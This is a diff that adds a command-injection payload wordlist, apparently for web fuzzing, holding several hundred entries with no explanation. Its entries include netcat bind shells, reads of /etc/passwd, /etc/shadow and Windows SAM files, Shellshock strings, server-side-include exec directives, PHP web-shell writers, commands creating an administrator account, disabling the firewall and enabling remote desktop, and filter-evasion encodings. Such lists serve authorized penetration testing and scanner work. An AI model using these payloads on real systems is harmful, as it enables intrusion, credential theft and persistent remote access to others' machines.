@@ -1,0 +1,580 @@
+ %0a id
+" & whoami
+" && whoami
+" whoami
+" | whoami
+" || whoami
+"& ping -i 30 127.0.0.1 &"
+"; whoami
+";id;"
+"\n/bin/ls -al\n"
+"w"h"o"a"m"i
+"|/usr/bin/id|"
+"|id|"
+"||/usr/bin/id|"
+$#
+$$
+$(`cat /etc/passwd`)
+$(`dir`)
+$(`ls`)
+$(`type c:\boot.ini`)
+$(`whoami`)
+$(a="whoami";printf %s "${a,,}")
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+$(ls)
+$(printf %.1s "$pwd")bin$(printf %.1s "$pwd")ls
+$(rev<<<'imaohw')
+$(tr "[a-z]" "[a-z]"<<<"whoami")
+$*
+$0
+$1
+$10
+$2
+$3
+$4
+$5
+$6
+$7
+$8
+$9
+$;/usr/bin/id
+$?
+$@
+$_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4].'(';$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4] . '.';$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$__ .= $_[4];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__ .= $_[4] . ')';
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+%0a sleep 10
+%0a%0d
+%0a/usr/bin/id
+%0a/usr/bin/id%0a
+%0acat%20/etc/passwd
+%0aid
+%0aid%0a
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1`
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20$(sleep%2050)
+%20'sleep%2050'
+%22%0a/usr/bin/id%0a%22
+& dir
+& dir c:\
+& dir c:\documents and settings\*
+& dir c:\users
+& id
+& ifconfig
+& ipconfig /all
+& ls -l /
+& ls -l /etc/
+& ls -l /home/*
+& ls -l /tmp
+& ls -l /var/www/*
+& ls -lar /etc
+& ls -lar /var/www
+& nc -lvvp 4444 -e /bin/sh&
+& net localgroup administrators hacker /add
+& net user hacker password1 /add
+& net view
+& netsh firewall set opmode disable
+& netstat -an
+& perl -e 'print "x"x16096'
+& perl -e 'print "x"x2048'
+& perl -e 'print "x"x4096'
+& phpinfo()
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+& pwd
+& reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
+& sleep 1
+& sleep 10 
+& sleep 15 
+& sleep 5
+& sysinfo
+& system('sleep 5');
+& systeminfo
+& type %systemroot%\repair\sam
+& type %systemroot%\repair\system
+& type c:\windows\repair\sam
+& type c:\windows\repair\system
+& type c:\winnt\repair\sam
+& uname -a
+& whoami
+&& dir
+&& dir c:\
+&& dir c:\documents and settings\*
+&& dir c:\users
+&& echo "<?php include($_get['page']); ?>" > rfi.php
+&& echo "<?php system($_get['cmd']); ?>" > cmd.php
+&& echo "<?php system('dir $_get['dir']'); ?>" > dir.php 
+&& ifconfig
+&& ipconfig /all
+&& ls -l /
+&& ls -l /etc/
+&& ls -l /home/*
+&& ls -l /tmp
+&& ls -l /var/www/*
+&& ls -lar /etc
+&& ls -lar /var/www
+&& nc -lvvp 4444 -e /bin/sh &
+&& net localgroup administrators hacker /add
+&& net user hacker password1 /add
+&& net view
+&& netsh firewall set opmode disable
+&& netstat -an
+&& perl -e 'print "x"x16096'
+&& perl -e 'print "x"x2048'
+&& perl -e 'print "x"x4096'
+&& perl -e 'print "x"x8096'
+&& phpinfo()
+&& pwd
+&& reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
+&& sleep 1
+&& sleep 10
+&& sleep 15
+&& sleep 5
+&& sysinfo
+&& system('sleep 5');
+&& systeminfo
+&& type %systemroot%\repair\sam
+&& type %systemroot%\repair\system
+&& type c:\windows\repair\sam
+&& type c:\windows\repair\system
+&& type c:\winnt\repair\sam
+&& uname -a
+&& whoami
+&&dir
+&&id
+&&type c:\\boot.ini
+&id
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+' & whoami
+' && whoami
+' whoami
+' || whoami
+'& ping -i 30 127.0.0.1 &'
+'; whoami
+';id;'
+';phpinfo();//
+'\n/bin/ls -al\n'
+'|/usr/bin/id|'
+'|id|'
+'||/usr/bin/id|'
+() { :;}; /bin/bash -c "\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "\`pwd\`"
+() { :;}; /bin/bash -c "\`uname -a\`"
+() { :;}; /bin/bash -c "\`whoami\`"
+() { :;}; /bin/bash -c "pwd"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 5 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; echo vulnerable 10
+() { :;};/usr/bin/perl -e 'print \"content-type: text/plain\\r\\n\\r\\nxsuccess!\";system(\"pwd\");'
+*; ls -lhtr /var/www/
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5`
+/../../");print_r(glob('*'));("
+/\b\i\n/////s\h
+/index.html|id|
+127.0.0.1 %0a ls
+127.0.0.1&&id
+127.0.0.1&id
+127.0.0.1;id
+127.0.0.1|id
+1;sleep${ifs}9
+1;sleep${ifs}9;
+; dir
+; dir c:\
+; dir c:\documents and settings\*
+; dir c:\users
+; id
+; ifconfig
+; ipconfig /all
+; ls -l /
+; ls -l /etc/
+; ls -l /home/*
+; ls -l /tmp
+; ls -l /var/www/*
+; ls -lar /etc
+; ls -lar /var/www
+; nc -lvvp 4444 -e /bin/sh;
+; net localgroup administrators hacker /add
+; net user hacker password1 /add
+; net view
+; netsh firewall set opmode disable
+; netstat -an
+; perl -e 'print "x"x16096'
+; perl -e 'print "x"x2048'
+; perl -e 'print "x"x4096'
+; perl -e 'print "x"x8096'
+; ping 127.0.0.1 ;
+; pwd
+; reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
+; sleep 1
+; sleep 10
+; sleep 15
+; sleep 5
+; sysinfo
+; system('sleep 5');
+; systeminfo
+; type %systemroot%\repair\sam
+; type %systemroot%\repair\system
+; type c:\windows\repair\sam
+; type c:\windows\repair\system
+; type c:\winnt\repair\sam
+; uname -a
+; whoami
+;/usr/bin/id\n
+;/usr/bin/id|
+;echo 111111
+;id
+;id;
+;id\n
+;id|
+;ls -la
+;netstat -a;
+;system('/usr/bin/id')
+;system('cat%20/etc/passwd')
+;system('id')
+;uname;
+;{$_get["cmd"]}
+;|/usr/bin/id|
+<!--#config errmsg="file not found, informs users and password"-->
+<!--#config timefmt="a %b %d %y %r"-->
+<!--#echo var="auth_type" -->
+<!--#echo var="content_length" -->
+<!--#echo var="content_type" -->
+<!--#echo var="date_gmt" -->
+<!--#echo var="date_local" -->
+<!--#echo var="document_name" -->
+<!--#echo var="document_root" -->
+<!--#echo var="document_uri" -->
+<!--#echo var="forwarded" -->
+<!--#echo var="from" -->
+<!--#echo var="gateway_interface" -->
+<!--#echo var="http_accept" -->
+<!--#echo var="http_accept_charset" -->
+<!--#echo var="http_accept_encoding" -->
+<!--#echo var="http_accept_language" -->
+<!--#echo var="http_client_ip" -->
+<!--#echo var="http_connection" -->
+<!--#echo var="http_cookie" -->
+<!--#echo var="http_form" -->
+<!--#echo var="http_host" -->
+<!--#echo var="http_referer" -->
+<!--#echo var="http_ua_cpu" -->
+<!--#echo var="http_ua_os" -->
+<!--#echo var="http_user_agent" -->
+<!--#echo var="last_modified" -->
+<!--#echo var="netsite_root" -->
+<!--#echo var="page_count" -->
+<!--#echo var="path" -->
+<!--#echo var="path_info" -->
+<!--#echo var="path_info_translated" -->
+<!--#echo var="path_translated" -->
+<!--#echo var="query_string" -->
+<!--#echo var="query_string_unescaped" -->
+<!--#echo var="remote_addr" -->
+<!--#echo var="remote_host" -->
+<!--#echo var="remote_ident" -->
+<!--#echo var="remote_port" -->
+<!--#echo var="remote_user" -->
+<!--#echo var="request_method" -->	
+<!--#echo var="request_uri" -->
+<!--#echo var="script_filename" -->
+<!--#echo var="script_name" -->
+<!--#echo var="script_uri" -->
+<!--#echo var="script_url" -->
+<!--#echo var="server_addr" -->
+<!--#echo var="server_admin" -->
+<!--#echo var="server_name -->
+<!--#echo var="server_port" -->
+<!--#echo var="server_protocol" -->
+<!--#echo var="server_software" -->
+<!--#echo var="site_htmlroot" -->
+<!--#echo var="total_hits" -->
+<!--#echo var="tz" -->
+<!--#echo var="unique_id" -->
+<!--#echo var="user_name" -->
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/bin/ls /" -->
+<!--#exec cmd="/usr/bin/id;-->
+<!--#exec cmd="cd c:\windows\system32">
+<!--#exec cmd="dir" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="wget http://localhost/" -->
+<!--#exec cmd="whoami"-->
+<!--#flastmod virtual="echo.html" -->
+<!--#fsize file="ssi.shtml" -->
+<!--#include file=?uuuuuuuu...uu?-->
+<!--#printenv -->
+<?php system("cat /etc/passwd");?>
+<?php system("echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<pre><!--#echo var="date_local" --> </pre>
+<pre><!--#exec cmd="dir" --></pre>
+<pre><!--#exec cmd="ls" --></pre>
+<pre><!--#exec cmd="whoami"--></pre>
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id\n
+\n/usr/bin/id|
+\n\033[2curl \`whoami\`
+\n\033[2wget \`whoami\`
+\necho injectx\nexit\n\033[2asleep 5\n
+\nid;
+\nid\n
+\nid|
+\nnetstat -a%\n
+\r
+\r\n
+\u\n\a\m\e \-\a
+`/usr/bin/id`
+`dir`
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+`echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+`id`
+`ls`
+`perl -e 'print ".%p" x 80'`%n
+`ping 127.0.0.1`
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
+a;id;
+a;id\n
+a;id|
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+a|/usr/bin/id
+a|id
+a|id|
+bash<<<$(base64 -d<<<d2hvyw1p)
+bash<<<$(base64 -d<<<y2f0ic9ldgmvcgfzc3dkihwgz3jlccazmw==)
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat ${home:0:1}etc${home:0:1}passwd
+cat /etc/hosts
+cat /etc/passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+cat$ifs/etc/passwd
+cat$u /etc$u/passwd$u
+cat${ifs}/etc/passwd
+dir
+dir c:\
+dir c:\documents and settings\*
+dir c:\users
+ech""o test
+ech''o test
+echo "ls\x09-l" | bash
+echo $((14+22))
+echo ${ls_colors:10:1}
+echo ${path:0:1}
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+echo whoami|$0
+echo${ifs}test
+eval eval py{o..u}hon\\ -m\\ simplehttpse{q..v}ve{q..v}\\;
+eval('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+id""&whoami"&&whoami"whoami"|whoami"||whoami"
+id%00
+id%00|
+ifconfig
+ifs=,;`cat<<<cat,/etc/passwd`
+ifs=];b=cat]/etc/passwd;$b
+ipconfig
+ipconfig /all
+ls
+ls %0a id
+ls & id
+ls && id
+ls &&id;
+ls &id;
+ls -l /
+ls -l /etc/
+ls -l /home/*
+ls -l /tmp
+ls -l /var/www/*
+ls -lh /etc/
+ls | id
+ls |id;
+ls || id
+ls ||id;
+ls${ls_colors:10:1}${ifs}id
+ls& id;
+ls&& id;
+ls&&id;
+ls&id;
+ls; id
+ls| id;
+ls|id;
+ls|| id;
+ls||id;
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+net localgroup administrators hacker /add
+net user hacker password1 /add
+net view
+netsh firewall set opmode disable
+netstat
+netstat -an
+p$(u)i$(u)n$(u)g
+p$(u)i$(u)n$(u)g 127.0.0.1
+p${u}i${u}n${u}g
+p${u}i${u}n${u}g 127.0.0.1
+perl -e 'print "x"x1024'
+perl -e 'print "x"x16384'
+perl -e 'print "x"x2048'
+perl -e 'print "x"x4096'
+perl -e 'print "x"x8192'
+perl -e 'print "x"x81920'
+printf %.1s "$pwd"
+pwd
+reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
+route
+sleep 1
+sleep 10
+sleep 5
+sysinfo
+system('cat /etc/passwd');
+system('cat c:\boot.ini');
+system('cat config.php');
+system('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+system('ls')
+system('pwd')
+system('pwd');
+system('sleep 5')
+system('sleep 5');
+system('whoami')
+system('whoami');
+systeminfo
+test* & perl -e 'print "x"x16096'
+test* && perl -e 'print "x"x16096'
+test* | perl -e 'print "x"x16096'
+test* || perl -e 'print "x"x16096'
+test*; ls -lhtr /var/www/
+test*; perl -e 'print "x"x16096'
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+type %systemroot%\repair\sam
+type %systemroot%\repair\system
+type c:\windows\repair\sam
+type c:\windows\repair\system
+type c:\winnt\repair\sam
+type c:\winnt\repair\system
+uname
+uname -a
+uname!-1\-a
+uniq [a-z][a-z][a-z][a-z].[a-z][a-z][a-z]
+w`u`h`u`o`u`a`u`m`u`i
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+while read -r line; do echo $line; done < /etc/passwd
+who$@ami
+whoami
+x=$'cat\x20/etc/passwd'&&$x
+xxd -r -ps <(echo 2f6574632f706173737764)
+{${phpinfo()}}
+{${sleep(10)}}
+{${sleep(20)}}
+{${sleep(3)}}
+{${sleep(hexdec(dechex(20)))}} 
+{% for c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{1} + {1}
+{cat,lol.txt}
+{echo,test}
+| dir
+| dir c:\
+| dir c:\documents and settings\*
+| dir c:\users
+| id
+| ifconfig
+| ipconfig /all
+| ls -l /
+| ls -l /etc/
+| ls -l /home/*
+| ls -l /tmp
+| ls -l /var/www/*
+| ls -lar /etc
+| ls -lar /var/www
+| nc -lvvp 4444 -e /bin/sh|
+| net localgroup administrators hacker /add
+| net user hacker password1 /add
+| net view
+| netsh firewall set opmode disable
+| netstat -an
+| perl -e 'print "x"x16096'
+| perl -e 'print "x"x4096'
+| perl -e 'print "x"x8096'
+| phpinfo()
+| pwd
+| reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
+| sleep 1
+| sleep 10
+| sleep 15
+| sleep 5
+| sysinfo
+| system('sleep 5');
+| systeminfo
+| type %systemroot%\repair\sam
+| type %systemroot%\repair\system
+| type c:\windows\repair\sam
+| type c:\windows\repair\system
+| type c:\winnt\repair\sam
+| uname -a
+| whoami
+|/bin/ls -al
+|/usr/bin/id
+|/usr/bin/id|
+|id
+|id;
+|id|
+|ls
+|ls -la
+|nid\n
+|usr/bin/id\n
+|| perl -e 'print "x"x16096'
+|| perl -e 'print "x"x4096'
+|| perl -e 'print "x"x8096'
+|| phpinfo()
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+|| sleep 10
+|| sleep 15
+|| system('sleep 5');
+||/usr/bin/id;
+||/usr/bin/id|
+||id
